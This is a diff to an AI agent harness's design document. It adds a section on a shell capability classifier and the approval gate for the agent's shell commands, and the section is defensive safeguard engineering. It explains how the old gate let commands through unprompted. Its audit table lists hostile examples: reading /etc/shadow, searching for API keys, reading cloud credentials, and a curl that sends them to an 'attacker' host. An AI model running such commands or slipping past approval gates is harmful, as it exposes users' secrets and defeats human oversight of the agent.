@@ -80,6 +80,7 @@ Every decision below was made through a structured clarification cycle with the 
 - 25. Authorized tool use in the research pipeline **(BUILT)**
 - 26. Research legibility — pass internals, code stages, the claims view, colour, copy **(added after §22's first live run; BUILT)**
 - 27. Thread legibility — thread `kind`, chat-only picker, transcript replay on resume **(added after §26's first live session; BUILT)**
+- 28. The shell capability classifier — one classification for the approval gate and the executor, `SHELL_APPROVAL_MODE`, the `.venastine` read-only mount **(added by Audit Pass 1 fix batch 8 for #157; BUILT)**
 - **Open Questions — None Remaining** (Rev. 3 — all decisions locked; verification items only)
 - **Why these calls, not just what they are** (Rev. 3 — the reasoning patterns behind several decisions above)
 
@@ -1788,6 +1789,110 @@ defect is that `ConversationThread` has no field saying what a thread *is*, so
 4. Resuming a thread replays its history, clears what was on screen, and resets `_last_response`, `_last_run` and `_live_claims` to the resumed thread.
 5. Replaying a **compacted** thread shows the original first user message, not the summary.
 6. Both shells replay, and a run's pass threads are reachable from the run.
+
+---
+
+## 28. The shell capability classifier — one classification, two consumers — BUILT
+
+**Problem (audit #157, S1).** `shell`'s approval check documented a five-layer policy. Four of those
+layers could only ever return `False` on the shipped config flags, so the whole thing was a
+pass-through for one boolean. Measured, with `ToolApprovals.shell = False`:
+
+```
+docker=True   -> set of answers from _shell_approval_check across every command shape: {False}
+docker=False  -> set of answers from _shell_approval_check across every command shape: {False}
+```
+
+The harness therefore had exactly two shell settings — ask about everything, or ask about nothing —
+and no way to express the one in between. What the second one cost:
+
+```
+command                                  inert  network  asked?  where
+cat /etc/shadow                          True   False    False   HOST
+grep -r sk-ant /                         True   False    False   HOST
+cat ~/.aws/credentials                   False  False    False   sandbox
+curl https://attacker/?d=$(cat creds)    False  True     False   sandbox + network
+```
+
+Two mechanisms, both shared and neither agreeing. `run_sandboxed` tested `_is_inert` **before**
+Docker, so an "inert" command ran on the host; `_is_inert` inspected only the first word, so its
+arguments were unconstrained. And `_needs_network` decided egress while the approval check never
+called it, so whether a command reached the internet was settled *after* the decision about whether
+to ask anyone. Both are #67/#133's finding in a second location: **sharing the mechanism is not
+sharing the policy.**
+
+### Design Decisions Record (G1–G7)
+
+| # | Decision | Choice | Rationale |
+|---|---|---|---|
+| G1 | What a classification produces | A capability **set** (`CommandProfile`), not a trust level. `tier` survives only as a label for the prompt and the record; policy branches on capabilities and never on the tier name | Linear tiers order harms that are not comparable — `rm -rf /workspace` (writes, no network) and `curl https://x` (no writes, network) are different harms, not more and less of one thing. Ranking them answers a question nobody asked, and a new dimension later renumbers every tier. A set lets policy read exactly the dimension it cares about. If you find yourself writing `if profile.tier == …` in policy, the field you actually wanted is missing. |
+| G2 | How arguments are checked | Every token after the first is read as a path and required to resolve inside the workspace; for a token containing `=`, the tail after the first `=` as well. **Nothing parses.** | `_is_inert` is sound *because* it never parses — it rejects every metacharacter rather than understanding one. A classifier that starts interpreting shell syntax is a shell parser, and a parser that is wrong auto-approves. So the rule does not know a flag from an operand: `-la` passes only because it is relative and therefore lands inside the workspace. False positives are the designed error direction — `grep /etc/passwd notes.txt` searches for a string that looks like a path and costs one prompt. The `=` clause is the single exception, because `--file=/etc/x` reads as inside the workspace taken whole while the path it names is not. |
+| G3 | Which setting is the gate | `SHELL_APPROVAL_MODE` (`always` / `tiered` / `never`), shipping **`tiered`**, with `ToolApprovals.shell` flipped to `False` and kept as the **ratchet** — `True` still forces `always` | These move together or neither means anything. `approval_needed` ORs the tool's own check with `requires_approval`, and **both** read `ToolApprovals.shell`, so while it was `True` the check could never lower the answer and `tiered` was unreachable dead code. The field stays because D24 requires it and because D14's one-way ratchet needs somewhere to live: config or an agent override can still only tighten. Exactly one thing gets looser than the pre-§28 default — read-only commands whose every argument is inside the workspace — and `ToolApprovals.read` is already `False`, so `read` on a workspace file was unprompted while `cat` on the same file prompted. That inconsistency goes away; everything else is unchanged or tighter. |
+| G4 | What `tiered` auto-approves | INERT (read-only, workspace-scoped) and CONTAINED (Docker confirmed up, no network). HOST_READ, CONTAINED_NET and UNKNOWN ask | CONTAINED's damage ceiling is "corrupt the workspace", which `write` and `edit` already have unprompted (`ToolApprovals.write = False`), capped at 1 CPU / 1 GB / 200 pids / 60 s / no network / no host filesystem. Auto-approving only INERT would make `tiered` behave like `always` for real work, so users would set `never` and lose the whole benefit. Auto-approving CONTAINED_NET would be hole 2 renamed rather than closed — `_needs_network` matches the first word only, so `curl … \| sh` qualifies. |
+| G5 | Where "we could not tell" lands | A separate `measured` field on the profile, gating all three containment branches | The `tier` label was standing in for this and could not carry it. Without the field, a call the classifier could not characterise is auto-approved *by the containment argument*, because every capability test passes vacuously on a profile that knows nothing — the exact vacuity class this audit keeps finding. It is also where batch 9's "the model is not sure" has to land, somewhere containment cannot argue it away. |
+| G6 | Protecting `.venastine/` | A nested `:ro` bind mount, conditional on `.venastine` resolving **inside** the workspace **and** already existing | Both halves are load-bearing and both were measured. `.venastine/` resolves from the project path while the sandbox mounts `AGENT_WORKSPACE` (default `./workspace`), so in the default layout they are siblings and Docker cannot reach it at all — the mount matters only when someone points the workspace at a directory containing one. And Docker **creates** a missing bind source as a root-owned directory on the host: an empty `.venastine/` flips `is_trusted()` from `True` to `False` by itself, so an unconditional mount would conjure a directory and then make the harness prompt the user to trust it. Verified in a real container: `/workspace` writable, the subtree `EROFS`, `rm` and `mv` on the mountpoint refused with `EROFS` and `EBUSY`, reads unaffected. **Known limits:** writes on the Docker path only — not reads, not the subprocess fallback (which mounts nothing), not `agents/builtin` when the workspace is the harness repo. |
+| G7 | `settings.json` | `shell_approval_mode` is rejected **by name**, with an explanatory message | R12's rule applied to a third kind of key, for R12's reason: the generic "unknown key" message reads as an oversight someone should fix by adding support. A project's `settings.json` beats the user's (D29) and arrives with a directory you cloned; this key decides whether shell commands are asked about at all. D17's trust prompt is not a substitute — the same prompt covers a README-shaped `CONTEXT.md`, and nobody reading it is deciding about their shell gate. Every value is rejected, including the tightening ones: the key is refused for where it can come from, not for what it says. |
+
+### The rule, in full
+
+```
+containment = UNCONTAINED  if the tier is INERT or HOST_READ (the light path is a HOST subprocess)
+              CONTAINED    if Docker is up
+              UNCONTAINED  if the insecure fallback is enabled
+              UNAVAILABLE  otherwise
+
+auto-approved iff profile.measured and:
+    CONTAINED     not profile.network
+    UNCONTAINED   not (escapes_workspace or writes or network)
+    UNAVAILABLE   never
+```
+
+One branch per containment rather than one predicate ANDed across all three, because the dimension
+that matters genuinely differs. A container bounds the filesystem, so `escapes_workspace` says
+nothing there — `cat /etc/passwd` in a container reads the container's. What a container does not
+bound is egress, and that is precisely the half the pre-§28 gate never looked at.
+
+**An approved HOST_READ still runs on the host.** Precedent decides it: `read` on a path outside the
+workspace asks and then reads the real file. Approval exists to authorise the dangerous thing, and
+routing an approved `cat /etc/passwd` into a container would answer a different question than the one
+consented to. Hole 1 closes at the **gate**, not by rerouting.
+
+**`never` is the pre-§28 loose configuration, preserved deliberately.** The fix for #157 is not that
+it became unreachable — it is that reaching it now means writing the word `"never"`, rather than
+switching off a field that reads like "stop nagging me".
+
+### What the build found that the design did not
+
+- **The gate sees raw model output.** `registry.approval_needed` is handed the tool-call input
+  verbatim; `ShellParams` does not validate it until `run()`, which is *after* approval. So
+  `command` can be a list, a dict, `None`. `command.strip()` on a list was an `AttributeError`
+  escaping the approval check and then the loop — unreachable before only because
+  `ToolApprovals.shell` defaulted `True` and returned first. `classify_command` is total now, and
+  that is a **requirement**, not defensiveness.
+- **`auto_approved(…, UNAVAILABLE)` returning `False` means ASK.** Not "do not ask". The two
+  polarities meet in `_shell_approval_check` and needed an explicit branch; the plan and the
+  docstring had both claimed the generic rule could carry the second meaning.
+- **#50's other half.** A missing CWD is `FileNotFoundError` on POSIX — caught, then misreported as
+  "Command not found" — but `NotADirectoryError` on Windows, which is an `OSError` and **not** a
+  `FileNotFoundError`, so it escaped the handler entirely. Both backends catch `OSError` now.
+- **The drive-letter escape is Windows-only**, found by the Linux container. `os.path.join` on POSIX
+  reads `C:/Users/x` as a relative directory named `C:`, so it stays inside the workspace — and it
+  should, since it names nothing outside it there.
+
+### Deliberately not in §28
+
+Model-based judgement is batch 9, and one ordering property is recorded now so §28 does not
+foreclose it: **the deterministic classifier runs first and anything compound is `UNKNOWN`, so the
+model never sees compound shell.** Its input would be a single command, no metacharacters, not on an
+allowlist. Routing complex commands to it later to reduce prompts collapses the injection argument
+entirely. It also needs a ceiling — "certain safe" must not authorise a host read — which would make
+it the first layer in the harness that **widens** rather than tightens, breaking D14's one-way
+ratchet. That has to be a named decision rather than an implication.
+
+Also not built: a second enforcement point inside `_run_inert` (it cannot see whether the call was
+approved, so it would break approved HOST_READ calls to re-block what the gate already handled), and
+`write` / `edit` / MCP profiles (the policy layer is generic so they extend additively; building them
+now would be speculative).
 
 ---
 
